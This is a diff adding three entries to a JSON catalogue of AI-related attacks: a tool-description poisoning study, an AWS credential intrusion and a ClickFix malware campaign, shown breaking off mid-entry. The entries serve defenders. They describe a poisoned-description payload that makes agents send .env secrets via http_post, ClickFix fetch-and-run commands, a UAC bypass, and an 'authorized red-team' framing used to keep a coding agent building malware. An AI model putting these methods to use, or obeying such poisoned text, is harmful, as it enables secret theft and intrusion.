@@ -1,7 +1,857 @@
 {
   "generated_at": "2026-11-15T00:00:00.000Z",
-  "count": 263,
+  "count": 272,
   "attacks": [
+    {
+      "id": "dynatrace-mcpvenom-tool-poisoning-2026-11",
+      "name": "Dynatrace mcpvenom measures MCP tool-description poisoning across 12 frameworks",
+      "date_reported": "2026-11-15",
+      "researcher": "Farooq Shaikh, Biagio Montaruli",
+      "org": "Dynatrace",
+      "sources": [
+        {
+          "url": "https://arxiv.org/abs/2611.03555",
+          "title": "MCP Tool Poisoning in Agentic AI Frameworks: A Cross-Framework Measurement Study",
+          "publisher": "AISec, ACM CCS 2026"
+        },
+        {
+          "url": "https://github.com/dynatrace-research/mcpvenom",
+          "title": "mcpvenom",
+          "publisher": "Dynatrace Research"
+        }
+      ],
+      "magicsword_coverage": [],
+      "borderline": true,
+      "borderline_note": "This is a lab measurement with planted secrets and a canary server. The paper does not describe an intrusion against a named organization. All five vendor disclosures were rejected.",
+      "ai_role": "ai_agent_or_mcp_as_target",
+      "ai_role_secondary": "ai_credential_theft",
+      "ai_role_detail": "A malicious MCP server sits beside a legitimate one. Its tool descriptions, schema text, or tool responses are copied into the model prompt. The measured harm is the legitimate http_post tool sending a planted secret to a canary.",
+      "technique_summary": "Farooq Shaikh and Biagio Montaruli (Dynatrace; AISec at ACM CCS 2026, Nov 15-19, The Hague) measure MCP tool poisoning with real tool execution. mcpvenom (https://github.com/dynatrace-research/mcpvenom) runs 45 scenarios across 12 frameworks and 18 models, 9,720 cells. The attacker controls one MCP server the user installed and can change tool descriptions, input-schema descriptions, and tool responses. The attacker cannot change the system prompt, user messages, framework code, or model weights. A legitimate server exposes read_file, write_file, list_files, http_get, and http_post. A planted secret sits in the workspace. A canary HTTP server on port 18080 records exfiltration. Overall, 2,113 cells were vulnerable (22.9 percent). Of those, 64.9 percent were a dispatched attacker tool call, 23.0 percent were confirmed network contact, and 12.1 percent were a verified secret in the canary log. Hand review covered 1,259 transcripts. Nine core frameworks clustered between 23 and 26 percent, and the paper says none of the 12 implements an intentional description check. Pydantic AI's duplicate-tool-name rejection landed at 16.6 percent, and AG2's executor constraints at 4.6 percent. A regex scanner the authors built rejected 20 of 45 scenarios and flagged 9 of 125 benign descriptions (7.2 percent). Model results ran from Claude Fable 5 at 0.4 percent to Amazon Nova Pro at 49.7 percent (245 of 493 cells). Claude Opus 4.8 was vulnerable in 8 of 530 cells (1.5 percent) and issued 223 refusals that cited the poisoned description. Claude Sonnet 5 sometimes named the text as prompt injection and then made the exfiltration call. The simplest high-signal payload appends an instruction to read /workspace/.env and send it with http_post. That direct-description class scored 29.2 percent aggregate ASR outside AG2. A language-switch payload scored 66.0 percent. Five disclosures to four organizations were rejected: two to LangChain, one to Microsoft for AutoGen via MSRC, one to the MCP SDK, and one to Haystack (deepset). The AutoGen rejection is about microsoft/autogen, which the paper says is not the AG2 0.14.0 fork in the matrix. Link invariant-mcp-tool-poisoning-2025-04, the earlier description-poisoning report this paper cites.",
+      "initial_access": "The user installs an MCP server whose tool description, schema text, or tool response carries the instruction. The paper's servers run over stdio in the lab.",
+      "ai_tooling_and_models": [
+        "mcpvenom (https://github.com/dynatrace-research/mcpvenom)",
+        "12 MCP frameworks, including LangChain 1.5.0, Pydantic AI 2.14.1, CrewAI 1.15.5, Semantic Kernel 1.44.0, Haystack 3.0.0, and AG2 0.14.0",
+        "18 models, from Claude Fable 5 (0.4 percent) to Amazon Nova Pro (49.7 percent)"
+      ],
+      "other_tooling": [
+        "Legitimate http_post tool used to send the planted secret",
+        "Canary HTTP server on port 18080"
+      ],
+      "victims_and_sectors": "No customer is named. The matrix uses planted workspace secrets and framework harnesses.",
+      "regions": [
+        "Not applicable"
+      ],
+      "attribution_or_cluster": "No threat actor. Dynatrace Research ran the measurement. The five vendor reports were rejected.",
+      "scale_and_metrics": "9,720 cells. 2,113 vulnerable (22.9 percent), including 255 cells (12.1 percent of the vulnerable set) with a canary receipt of the secret. 45 scenarios. 12 frameworks. 18 models.",
+      "prevention_angle": "Review an MCP server's tool descriptions before adding it, and treat a description that names another tool, a file such as .env, or an outbound URL as hostile. Do not assume the framework checks that text. The paper's own regex scanner missed 25 of 45 scenarios, so a description scan is only a partial control. Prefer a model that refused in this matrix, and still review the server, because the paper says no framework defense made up for a susceptible model.",
+      "related_magicsword_projects": [
+        "LOLSkills"
+      ],
+      "source_notes": "Counts, model rates, framework versions, the http_post payload, the canary port, and the five rejections are from the paper text at https://arxiv.org/abs/2611.03555. The workshop dates are Nov 15-19, 2026. The paper does not give a separate preprint day, so date_reported is the workshop start. Link invariant-mcp-tool-poisoning-2025-04.",
+      "last_reviewed": "2026-11-15",
+      "region_notes": "The Hague is the workshop location, not a victim region. Downloads in the paper's framework table are as of May 2026 and are not a victim count.",
+      "iocs": {
+        "domains": [],
+        "ips": [],
+        "hashes": [],
+        "urls": []
+      },
+      "atlas_techniques": [
+        {
+          "id": "AML.T0051.001",
+          "rationale": "Tool descriptions, schema text, and tool responses are attacker-controlled fields copied into the model prompt",
+          "source_urls": [
+            "https://arxiv.org/abs/2611.03555"
+          ]
+        },
+        {
+          "id": "AML.T0053",
+          "rationale": "The successful cells invoke a legitimate tool, most clearly http_post, because the poisoned description told the model to",
+          "source_urls": [
+            "https://arxiv.org/abs/2611.03555"
+          ]
+        },
+        {
+          "id": "AML.T0055",
+          "rationale": "The verified tier is a planted workspace secret received by the canary HTTP server",
+          "source_urls": [
+            "https://arxiv.org/abs/2611.03555"
+          ]
+        }
+      ],
+      "attack_flow": {
+        "nodes": [
+          {
+            "id": "install",
+            "title": "Malicious MCP server is installed",
+            "description": "The user adds a server the attacker published. It is registered next to a legitimate server that can read files and call http_post.",
+            "kind": "access",
+            "source_urls": [
+              "https://arxiv.org/abs/2611.03555"
+            ]
+          },
+          {
+            "id": "describe",
+            "title": "Poisoned description enters the prompt",
+            "description": "Frameworks copy tool descriptions, schema text, and tool responses into the model context. The paper says none of the 12 checks that text on purpose.",
+            "kind": "ai",
+            "source_urls": [
+              "https://arxiv.org/abs/2611.03555"
+            ]
+          },
+          {
+            "id": "post",
+            "title": "http_post carries the secret",
+            "description": "A typical payload tells the model to read /workspace/.env and send it with the legitimate http_post tool.",
+            "kind": "execution",
+            "source_urls": [
+              "https://arxiv.org/abs/2611.03555"
+            ]
+          },
+          {
+            "id": "canary",
+            "title": "Canary confirms exfiltration",
+            "description": "255 of the vulnerable cells put the planted secret on the canary at port 18080. The full vulnerable set is 2,113 of 9,720 cells.",
+            "kind": "impact",
+            "source_urls": [
+              "https://arxiv.org/abs/2611.03555"
+            ]
+          }
+        ],
+        "edges": [
+          {
+            "source": "install",
+            "target": "describe"
+          },
+          {
+            "source": "describe",
+            "target": "post"
+          },
+          {
+            "source": "post",
+            "target": "canary"
+          }
+        ]
+      },
+      "category": "attacks-on-ai",
+      "attribution": {
+        "actor_name": "unknown",
+        "motivation": "unknown",
+        "attributed_by": "Dynatrace",
+        "confidence": "low"
+      },
+      "ai_involvement_confidence": "confirmed",
+      "detections": [
+        {
+          "name": "Lab tool-description poisoning has no product rule",
+          "format": "guidance",
+          "notes": "The paper's signal is a tool description that instructs a read of .env and an http_post, then a request to a canary on port 18080. No Sigma, Splunk, or Elastic rule names MCP tool descriptions. Review descriptions at install time. The authors' regex scanner rejected 20 of 45 scenarios and flagged 9 of 125 benign descriptions, so a scan is not coverage by itself."
+        }
+      ],
+      "timeline": {
+        "first_seen": "2026-11-15",
+        "last_updated": "2026-11-15",
+        "updates": [
+          {
+            "date": "2026-11-15",
+            "source": "Dynatrace",
+            "summary": "AISec workshop paper, Nov 15-19, 2026. mcpvenom results: 22.9 percent of 9,720 cells vulnerable, and five vendor disclosures rejected."
+          }
+        ]
+      }
+    },
+    {
+      "id": "elastic-cyberstrikeai-aws-cloudtrail-2026-11",
+      "name": "Elastic CyberStrikeAI server reads AWS user data, secrets, and sends an SSM command",
+      "date_reported": "2026-11-13",
+      "date_activity_start": "2026-09-30",
+      "date_activity_end": "2026-10-16",
+      "researcher": "Samir Bousseaden, Bryan Porras Blanch, Terrance DeJesus",
+      "org": "Elastic Security Labs",
+      "sources": [
+        {
+          "url": "https://www.elastic.co/security-labs/threat-command/cyberstrikeai-aws-cloudtrail-intrusion",
+          "title": "56 AWS API calls in 141 milliseconds: Inside an AI-run intrusion",
+          "publisher": "Elastic Security Labs"
+        },
+        {
+          "url": "https://github.com/AIPentest/CyberStrikeAI",
+          "title": "CyberStrikeAI",
+          "publisher": "AIPentest"
+        }
+      ],
+      "magicsword_coverage": [],
+      "borderline": false,
+      "borderline_note": null,
+      "ai_role": "attacker_uses_ai_as_operator",
+      "ai_role_secondary": "ai_credential_theft",
+      "ai_role_detail": "Elastic attributes the AWS calls to a CyberStrikeAI server from scan data and machine-speed CloudTrail. Elastic says it cannot prove an LLM agent made the decisions and does not know how the credentials were stolen.",
+      "technique_summary": "Elastic Security Labs (Samir Bousseaden, Bryan Porras Blanch, Terrance DeJesus; Nov 13, 2026) describes one CyberStrikeAI server, 43.240.29.11 (AS133199, SonderCloud Limited, Hong Kong), using stolen credentials for eight identities across four AWS accounts from Sep 30 to Oct 16, 2026. Five were IAM users and three were EC2 instance roles. The role sessions were named after instance IDs, and using them from an outside IP means the credentials were taken off the instances. Activity fell on four days and produced 78 alerts, all medium or low, which Elastic says only cohered once correlated by source IP. On Sep 30 the server called GetCallerIdentity on four IAM users across three accounts within 51 minutes, three of those calls in the same second, plus GetSessionToken. The same day app-role read Secrets Manager and then issued 56 DescribeInstanceAttribute userData calls in 141 milliseconds (about 2.5 ms per call), part of 57 user-data reads from one assumed-role session that day and 58 user-data alerts overall. On Oct 1 it revalidated credentials, read more secrets with app-role, and used nonprod-role for two GetSecretValue calls. On Oct 2 container-role called GetParameter with decryption on an SSM SecureString and SendCommand 29 seconds later. CloudTrail does not show the command text or whether it succeeded. After 14 quiet days, on Oct 16 the server called GetSessionToken for a previously unseen user in a fourth account and rechecked two earlier users. Internet scan data showed 43.240.29.11 serving a CyberStrikeAI page on port 8080, with a self-signed certificate (CN CyberStrikeAI, serial 3356730520974368630, issued 2026-09-15), one day before the first alert. 43.240.29.28 and 43.240.29.33 served the same page, FOFA fid, and certificate but were not in this AWS telemetry. Elastic says none of the three was still serving that interface as of November 2026. Six Elastic rules fired: AWS EC2 User Data Retrieval for EC2 Instance (58, medium), AWS STS GetCallerIdentity API Called for the First Time (11, medium), First Time Seen AWS Secret Value Accessed in Secrets Manager (4, medium), AWS STS GetSessionToken Usage (3, low), AWS SSM SendCommand Execution by Rare User (1, low), and AWS Systems Manager SecureString Parameter Request with Decryption Flag (1, medium). Elastic added two high-severity rules: AWS EC2 Bulk User Data Enumeration (more than 20 distinct instances in 10 minutes) and AWS STS GetCallerIdentity Bulk Account Enumeration (three or more distinct non-role identities from the same external IP and ASN in 10 minutes). Elastic, citing Will Thomas at Team Cymru, says 21 CyberStrikeAI IPs were counted in early 2026, aimed at Fortinet edge devices, and that this is the first Elastic case of the same tooling turned on AWS. The repository contains 24 SKILL.md files, including skills/unlimited-attack-scope/SKILL.md and skills/cloud-attack-methods/SKILL.md. Elastic cites https://github.com/Ed1s0nZ/CyberStrikeAI, which redirects to https://github.com/AIPentest/CyberStrikeAI. Link kaspersky-cyberstrikeai-schools-2026 and trendai-chinese-language-operators-used-cyberstrikeais-2026-10.",
+      "initial_access": "Stolen AWS credentials for five IAM users and three EC2 instance roles, used from an external IP. Elastic does not know how the credentials were obtained.",
+      "ai_tooling_and_models": [
+        "CyberStrikeAI (https://github.com/AIPentest/CyberStrikeAI), web interface on TCP 8080",
+        "24 SKILL.md files in the repository, including unlimited-attack-scope and cloud-attack-methods"
+      ],
+      "frameworks": [
+        "cyberstrikeai"
+      ],
+      "other_tooling": [
+        "AWS APIs GetCallerIdentity, GetSessionToken, GetSecretValue, DescribeInstanceAttribute, GetParameter, SendCommand"
+      ],
+      "victims_and_sectors": "Four AWS accounts. Account and identity names were replaced with aliases. No sector was named.",
+      "regions": [
+        "unknown"
+      ],
+      "attribution_or_cluster": "Unnamed operator. Elastic confirms the source IP served CyberStrikeAI. No country or motivation is stated. Hong Kong is the hosting location.",
+      "scale_and_metrics": "One server, eight identities, four accounts, 78 alerts, four active days from Sep 30 to Oct 16, 2026. Fifty-six userData calls in 141 milliseconds. Sixty-five of 78 alerts fell on Sep 30.",
+      "prevention_angle": "Rotate every identity that touched 43.240.29.11 and revoke active sessions. Replace instance profiles whose role credentials were used off-instance. Treat secrets in EC2 user data as exposed. Review SSM command history for the Oct 2 SendCommand. Restrict ec2:DescribeInstanceAttribute for userData. Correlate medium and low CloudTrail alerts by source IP across multi-day gaps.",
+      "related_magicsword_projects": [
+        "LOLSkills"
+      ],
+      "source_notes": "API sequence, alert counts, rule names, certificate serial 3356730520974368630, and the three IPs are from the Elastic article. Only 43.240.29.11 appeared in the AWS alerts. The 24 SKILL.md count was checked on the repository default branch on 2026-11-15. Elastic cites https://github.com/Ed1s0nZ/CyberStrikeAI; that URL redirected to https://github.com/AIPentest/CyberStrikeAI. Link kaspersky-cyberstrikeai-schools-2026 and trendai-chinese-language-operators-used-cyberstrikeais-2026-10.",
+      "last_reviewed": "2026-11-15",
+      "region_notes": "No victim country is stated. Hong Kong and AS133199 are the server's hosting location and are not recorded as a target region.",
+      "iocs": {
+        "domains": [],
+        "ips": [
+          "43.240.29.11",
+          "43.240.29.28",
+          "43.240.29.33"
+        ],
+        "hashes": [],
+        "urls": []
+      },
+      "atlas_techniques": [
+        {
+          "id": "AML.T0016.001",
+          "rationale": "Elastic ties the calls to a host that was serving the CyberStrikeAI console",
+          "source_urls": [
+            "https://www.elastic.co/security-labs/threat-command/cyberstrikeai-aws-cloudtrail-intrusion"
+          ]
+        },
+        {
+          "id": "AML.T0012",
+          "rationale": "Stolen IAM user and EC2 instance-role credentials were used from an external IP",
+          "source_urls": [
+            "https://www.elastic.co/security-labs/threat-command/cyberstrikeai-aws-cloudtrail-intrusion"
+          ]
+        },
+        {
+          "id": "AML.T0055",
+          "rationale": "The server read Secrets Manager values, EC2 user data, and a decrypted SSM SecureString",
+          "source_urls": [
+            "https://www.elastic.co/security-labs/threat-command/cyberstrikeai-aws-cloudtrail-intrusion"
+          ]
+        }
+      ],
+      "attack_flow": {
+        "nodes": [
+          {
+            "id": "validate",
+            "title": "GetCallerIdentity sweeps",
+            "description": "On Sep 30 the server validates four IAM users across three accounts, with three GetCallerIdentity calls in one second, and requests GetSessionToken.",
+            "kind": "access",
+            "source_urls": [
+              "https://www.elastic.co/security-labs/threat-command/cyberstrikeai-aws-cloudtrail-intrusion"
+            ]
+          },
+          {
+            "id": "userdata",
+            "title": "56 userData reads in 141 ms",
+            "description": "app-role calls DescribeInstanceAttribute for userData 56 times in 141 milliseconds after an earlier GetSecretValue.",
+            "kind": "ai",
+            "source_urls": [
+              "https://www.elastic.co/security-labs/threat-command/cyberstrikeai-aws-cloudtrail-intrusion"
+            ]
+          },
+          {
+            "id": "ssm",
+            "title": "Decrypt a parameter, then SendCommand",
+            "description": "On Oct 2 container-role reads an SSM SecureString and issues SendCommand 29 seconds later. The command text is not in the audit log.",
+            "kind": "execution",
+            "source_urls": [
+              "https://www.elastic.co/security-labs/threat-command/cyberstrikeai-aws-cloudtrail-intrusion"
+            ]
+          },
+          {
+            "id": "return",
+            "title": "Recheck after 14 days",
+            "description": "On Oct 16 the same server calls GetSessionToken in a fourth account and revalidates two earlier users.",
+            "kind": "impact",
+            "source_urls": [
+              "https://www.elastic.co/security-labs/threat-command/cyberstrikeai-aws-cloudtrail-intrusion"
+            ]
+          }
+        ],
+        "edges": [
+          {
+            "source": "validate",
+            "target": "userdata"
+          },
+          {
+            "source": "userdata",
+            "target": "ssm"
+          },
+          {
+            "source": "ssm",
+            "target": "return"
+          }
+        ]
+      },
+      "category": "adversary-use-of-ai",
+      "attribution": {
+        "actor_name": "Unnamed CyberStrikeAI operator",
+        "country": "Unknown",
+        "motivation": "unknown",
+        "attributed_by": "Elastic Security Labs",
+        "confidence": "medium"
+      },
+      "ai_involvement_confidence": "vendor-asserted",
+      "detections": [
+        {
+          "name": "AWS EC2 User Data Retrieval for EC2 Instance",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/discovery_ec2_userdata_request_for_ec2_instance.toml",
+          "notes": "AWS CloudTrail. DescribeInstanceAttribute for userData. Elastic says this rule fired 58 times."
+        },
+        {
+          "name": "AWS EC2 Bulk User Data Enumeration",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/discovery_ec2_bulk_user_data_enumeration.toml",
+          "notes": "AWS CloudTrail. Elastic added this high-severity rule for more than 20 distinct userData reads by one principal and source IP in 10 minutes. The intrusion had 56 calls in 141 milliseconds."
+        },
+        {
+          "name": "AWS STS GetCallerIdentity API Called for the First Time",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/discovery_new_terms_sts_getcalleridentity.toml",
+          "notes": "AWS CloudTrail. First GetCallerIdentity for an identity. Elastic says this rule fired 11 times."
+        },
+        {
+          "name": "AWS STS GetCallerIdentity Bulk Account Enumeration",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/discovery_sts_getcalleridentity_bulk_account_enumeration.toml",
+          "notes": "AWS CloudTrail. Elastic added this high-severity rule for three or more distinct non-role identities calling GetCallerIdentity from the same external IP and ASN in 10 minutes."
+        },
+        {
+          "name": "First Time Seen AWS Secret Value Accessed in Secrets Manager",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/credential_access_new_terms_secretsmanager_getsecretvalue.toml",
+          "notes": "AWS CloudTrail. First GetSecretValue. Elastic says this rule fired 4 times, including app-role and nonprod-role."
+        },
+        {
+          "name": "AWS Systems Manager SecureString Parameter Request with Decryption Flag",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/credential_access_retrieve_secure_string_parameters_via_ssm.toml",
+          "notes": "AWS CloudTrail. GetParameter with decryption. Matches the Oct 2 container-role read."
+        },
+        {
+          "name": "AWS SSM `SendCommand` Execution by Rare User",
+          "format": "elastic",
+          "url": "https://github.com/elastic/detection-rules/blob/main/rules/integrations/aws/execution_ssm_sendcommand_by_rare_user.toml",
+          "notes": "AWS CloudTrail. Rare SendCommand. Matches the command issued 29 seconds after the SecureString read. The article's low-severity rule name is AWS SSM SendCommand Execution by Rare User."
+        },
+        {
+          "name": "GetSessionToken and off-instance role use",
+          "format": "guidance",
+          "notes": "The article also names AWS STS GetSessionToken Usage (3 low alerts). The public rule titled AWS IAM API Calls via Temporary Session Tokens describes later IAM calls that use a temporary token, not the GetSessionToken API itself, so it is not cited. Also hunt instance-role credentials whose source IP is not the instance or the organization's NAT, and the certificate serial 3356730520974368630."
+        }
+      ],
+      "timeline": {
+        "first_seen": "2026-09-30",
+        "last_updated": "2026-11-15",
+        "updates": [
+          {
+            "date": "2026-09-30",
+            "source": "Elastic Security Labs",
+            "summary": "43.240.29.11 validates IAM users, reads Secrets Manager, and issues 56 userData calls in 141 milliseconds"
+          },
+          {
+            "date": "2026-10-02",
+            "source": "Elastic Security Labs",
+            "summary": "container-role reads a decrypted SSM parameter and calls SendCommand 29 seconds later"
+          },
+          {
+            "date": "2026-10-16",
+            "source": "Elastic Security Labs",
+            "summary": "The same server returns after 14 days and revalidates credentials, including a fourth account"
+          },
+          {
+            "date": "2026-11-13",
+            "source": "Elastic Security Labs",
+            "summary": "Elastic publishes the CloudTrail write-up and two high-severity bulk enumeration rules"
+          },
+          {
+            "date": "2026-11-15",
+            "source": "OpenAttacks",
+            "summary": "Tagged CyberStrikeAI. Country is Unknown because Elastic states no country."
+          }
+        ]
+      },
+      "linked_tools": [
+        "cyberstrikeai"
+      ]
+    },
+    {
+      "id": "socradar-xaocmail-phantom53-claude-code-2026-11",
+      "name": "SOCRadar XaocMail ClickFix delivers Phantom53 and HavoX, built with Claude Code",
+      "date_reported": "2026-11-13",
+      "date_activity_start": "2025-10",
+      "researcher": "SOCRadar Threat Research Unit (STRU)",
+      "org": "SOCRadar",
+      "sources": [
+        {
+          "url": "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/",
+          "title": "XaocMail ClickFix Campaign Drops Phantom53 and HavoX Across Latin America, Asia, and Europe",
+          "publisher": "SOCRadar"
+        }
+      ],
+      "magicsword_coverage": [],
+      "borderline": false,
+      "borderline_note": null,
+      "ai_role": "attacker_uses_ai_as_operator",
+      "ai_role_secondary": "ai_credential_theft",
+      "ai_role_detail": "SOCRadar found Claude Code project files, 143 numbered task markdown files, a 117 KB architecture note, and a Russian prompt that frames implant testing as an authorized red-team job.",
+      "technique_summary": "SOCRadar Threat Research Unit (published Nov 13, 2026) describes a Russian-speaking operator chaining XaocMail, Phantom53, and HavoX (Havoc Demon). Preparation began in October 2025. Phishing tests and framework development continued in early 2026. The operation launched in August 2026 and was still active at publication. XaocMail, on 185.224.132.148:8585, builds per-victim document-sharing lures (Google Docs, Adobe Acrobat, Office365, SecuredDocs) and stores landing JSON in Cloudflare KV. Emails point at hxxps://securedoc.[subdomain].workers.dev/?id={linkId}. The ClickFix page offers three Win+R paths: a PowerShell DownloadString cradle, mshta against /h?id=X (an earlier ZIP of GUP.exe sideloading libcurl.dll), and msiexec /i .../m?id=X /qn, which SOCRadar calls the active path. The MSI impersonates names such as Visual Studio Tools, Python, or Node.js and drops Python 3.11 under a random directory in AppData or LocalAppData. A pythonw scheduled task runs the beacon every 12 minutes. A second task runs the watcher every 3 minutes. The beacon is a .pyd named like a real package (cv2.pyd, with PyInit_cv2, and the same pattern for numpy, PIL, and lxml). It beacons over DNS-over-HTTPS to Cloudflare, Google, and ControlD, encoding commands in AAAA records, with UDP/53 as a fallback, and a week-keyed SHA256 DGA on .xyz. CMD_WAKE writes an IPC file so the watcher reflectively loads an AES-GCM HavoX blob in memory. If the MSI is not elevated it can show a UAC prompt for a product-named task, and a separate payload uses fodhelper.exe registry hijacking. Payload aliases include a Level RMM drop from downloads.level.io and an AI-secret stealer covering Claude Code, Codex, Gemini CLI, Cursor, Windsurf, and other AI tools, plus password-manager, browser, SSH, git, wallet, and messaging collection. SOCRadar's AI evidence is on the operator side: .claude/settings.json, 143 numbered NNN-task-name.md files across adminka (25), implant_v3 (31), and implant_v4 (87), a 117 KB implant_v4/arch.md, and implant_v4/.tasks/prompts/noav-beacon-test.md, a Russian prompt for a claudeg5f-tmux Claude wrapper that tells the agent to install a test MSI on a VM named NoAV under an authorized red-team framing. HavoX's login panel and an exfiltration path are on 145.63.138.67. Almost a thousand personalized pages were identified. Named target countries are Brazil, Peru, India, Indonesia, and Spain, across technology, finance, education, government, logistics, and manufacturing. SOCRadar did not confirm attacker intent beyond the footholds.",
+      "initial_access": "Spearphishing links from XaocMail to Cloudflare Worker ClickFix pages that ask the user to run msiexec, mshta, or a PowerShell cradle",
+      "ai_tooling_and_models": [
+        "Claude Code (.claude/settings.json, numbered task files, claudeg5f-tmux prompt wrapper)",
+        "AI-secret stealer aimed at Claude Code, Codex, Gemini CLI, Cursor, and Windsurf"
+      ],
+      "other_tooling": [
+        "XaocMail phishing panel",
+        "Phantom53 DoH beacon and watcher (.pyd under pythonw.exe)",
+        "HavoX / Havoc Demon, reflective load",
+        "Cloudflare Workers and KV",
+        "msiexec, mshta, PowerShell (LOLBAS)",
+        "GUP.exe sideloading libcurl.dll (HijackLibs), earlier path",
+        "fodhelper.exe UAC bypass (LOLBAS)",
+        "Level RMM (LOLRMM)"
+      ],
+      "victims_and_sectors": "Technology, finance, education, government, logistics, and manufacturing. Almost a thousand personalized lure pages. No organization names are listed here.",
+      "regions": [
+        "Brazil",
+        "Peru",
+        "India",
+        "Indonesia",
+        "Spain"
+      ],
+      "attribution_or_cluster": "Unnamed Russian-speaking operator. SOCRadar does not name a country or a tracked cluster.",
+      "scale_and_metrics": "Almost a thousand personalized XaocMail pages. 143 Claude Code task files. implant_v4/arch.md is 117 KB. No victim-host count was published.",
+      "prevention_angle": "Block ClickFix paste-and-run. Alert when explorer.exe starts msiexec.exe with a workers.dev URL, when mshta.exe fetches an HTTP URL, and when pythonw.exe runs a .pyw from AppData and loads a .pyd outside a normal Python install. Hunt scheduled tasks named like MicrosoftEdgeUpdateTask, OneDriveSyncTask, WindowsDefenderScheduledScan, OfficeBackgroundTaskHandler, or AdobeAcrobatUpdateTask with a short random suffix. Treat DoH from pythonw.exe to 1.1.1.1, 8.8.8.8, or 76.76.2.11 as suspicious when paired with those tasks.",
+      "related_magicsword_projects": [
+        "LOLBAS",
+        "HijackLibs",
+        "LOLRMM"
+      ],
+      "source_notes": "Chain, timings, Claude Code artifacts, and IOCs are from the SOCRadar article. Operator mailbox addresses in that IOC table are omitted. Victim names and stolen-file contents are not included. The article lists additional MSI and payload hashes beyond the set below. Havoc is the public framework; HavoX is SOCRadar's name for this operator's Demon build.",
+      "last_reviewed": "2026-11-15",
+      "region_notes": "Brazil, Peru, India, Indonesia, and Spain are the countries SOCRadar names. The article also describes the set as Latin America, Asia, and Europe. Operator language is not a victim region.",
+      "iocs": {
+        "domains": [
+          "dns.timesyncserver-312453.com",
+          "securedoc.makeneg458.workers.dev",
+          "securedoc.mesuttgulerr573.workers.dev",
+          "linkrot.fypahedupal2-0maz.workers.dev",
+          "sync-node-serv.com",
+          "dns.cdn-syncnode-server.com",
+          "a8f2aac37385.xyz",
+          "kfkwrfdd.xyz",
+          "544504d7fe1e.xyz",
+          "bestutyresdomaonupder.com"
+        ],
+        "ips": [
+          "185.224.132.148",
+          "145.63.138.67",
+          "162.252.198.204",
+          "162.252.199.92",
+          "94.156.152.7",
+          "91.132.93.251",
+          "176.9.154.69"
+        ],
+        "hashes": [
+          "bceeb2d54b6a756c73a3e06617e9e95ad4d8e53da47639bcd6ef3cae98c6da6d",
+          "7055483a77f679ad569c3a9bfe76cdb8e5b96efc44d2bf2a6f08e930add598b0",
+          "4f656834e545c0b44922ce6d8952989c8c0859d8ae8b1f117c06ab07b047e2b4",
+          "8ebb2bf61b48ae7abdcd674413bebd79b30ddd945854e175ba60d56c0a3adf54",
+          "a4ad001c6900176eba43a747ae5d212db6fc78f7ef4e777f276cbbdf8099dbe8",
+          "0aff424f9a02eb9f429119c4caa05e85fc952603549d69849e745293d20235d6"
+        ],
+        "urls": []
+      },
+      "atlas_techniques": [
+        {
+          "id": "AML.T0016.002",
+          "rationale": "Claude Code task files, settings, and a Russian test prompt show the operator used a Claude agent to build and test the implant",
+          "source_urls": [
+            "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/"
+          ]
+        },
+        {
+          "id": "AML.T0054",
+          "rationale": "The NoAV prompt frames the job as authorized red-team work so the agent stays on task",
+          "source_urls": [
+            "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/"
+          ]
+        },
+        {
+          "id": "AML.T0055",
+          "rationale": "A payload alias steals secrets from Claude Code, Codex, Gemini CLI, Cursor, Windsurf, and other AI tools",
+          "source_urls": [
+            "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/"
+          ]
+        },
+        {
+          "id": "AML.T0052",
+          "rationale": "XaocMail sends document-sharing phishing links to Cloudflare Worker ClickFix pages",
+          "source_urls": [
+            "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/"
+          ]
+        }
+      ],
+      "attack_flow": {
+        "nodes": [
+          {
+            "id": "phish",
+            "title": "XaocMail sends the lure",
+            "description": "A self-hosted panel writes a per-victim landing page to Cloudflare KV and emails a workers.dev link.",
+            "kind": "access",
+            "source_urls": [
+              "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/"
+            ]
+          },
+          {
+            "id": "clickfix",
+            "title": "ClickFix runs the MSI",
+            "description": "The page asks the user to run msiexec /i against /m?id=, or an older mshta or PowerShell path.",
+            "kind": "execution",
+            "source_urls": [
+              "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/"
+            ]
+          },
+          {
+            "id": "beacon",
+            "title": "pythonw beacon over DoH",
+            "description": "Python 3.11 in AppData runs cv2.pyd every 12 minutes and a watcher every 3 minutes. Commands return inside DNS AAAA answers.",
+            "kind": "execution",
+            "source_urls": [
+              "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/"
+            ]
+          },
+          {
+            "id": "claude",
+            "title": "Claude Code built the implant",
+            "description": "The operator tree has .claude/settings.json, 143 numbered task files, a 117 KB arch.md, and a Russian authorized-red-team test prompt.",
+            "kind": "ai",
+            "source_urls": [
+              "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/"
+            ]
+          },
+          {
+            "id": "havoc",
+            "title": "HavoX in memory and AI-secret theft",
+            "description": "CMD_WAKE loads the Havoc Demon reflectively. Aliases include Level RMM and a stealer for Claude Code, Codex, Gemini CLI, Cursor, and Windsurf.",
+            "kind": "impact",
+            "source_urls": [
+              "https://socradar.io/blog/xaocmail-clickfix-phantom53-havox-america-asia-europe/"
+            ]
+          }
+        ],
+        "edges": [
+          {
+            "source": "phish",
+            "target": "clickfix"
+          },
+          {
+            "source": "clickfix",
+            "target": "beacon"
+          },
+          {
+            "source": "beacon",
+            "target": "havoc"
+          },
+          {
+            "source": "claude",
+            "target": "beacon"
+          }
+        ]
+      },
+      "category": "adversary-use-of-ai",
+      "attribution": {
+        "actor_name": "Unnamed Russian-speaking operator",
+        "motivation": "cybercrime",
+        "attributed_by": "SOCRadar Threat Research Unit",
+        "confidence": "low"
+      },
+      "ai_involvement_confidence": "confirmed",
+      "detections": [
+        {
